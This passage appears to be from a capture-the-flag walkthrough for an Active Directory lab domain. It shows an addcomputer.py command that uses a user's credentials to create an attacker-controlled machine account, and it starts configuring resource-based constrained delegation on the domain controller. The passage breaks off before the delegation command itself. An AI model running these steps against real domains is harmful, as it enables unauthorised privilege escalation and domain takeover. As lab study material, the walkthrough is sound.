#### Create an attacker-controlled computer account 

Search:

Using the script `addcomputer.py`:
````
addcomputer.py -computer-name 'ATTACKSYS$' -computer-pass 'k44n00ng' -dc-host DC01 -domain-netbios ctf.local 'ctf.local/r.williams:Helpdesk01!'
````

The current Forward solution uses this exact concept: create a machine account that we control, because ``RBCD`` needs an identity that ``DC01`` can be configured to trust.


> **Note**: In `-computer-pass` we can use others password, so in this I used this password `k44n00ng`.

##### Configure RBCD
Now tell ``DC01$`` to trust ``ATTACKSYS$``, but in this I want to check tools first:
````
which rbcd.py
````
<img width="375" height="74" alt="image" src="https://github.com/user-attachments/assets/d1cd669b-e99d-413c-bfae-b0883ad5ac9e" />



Then run this:
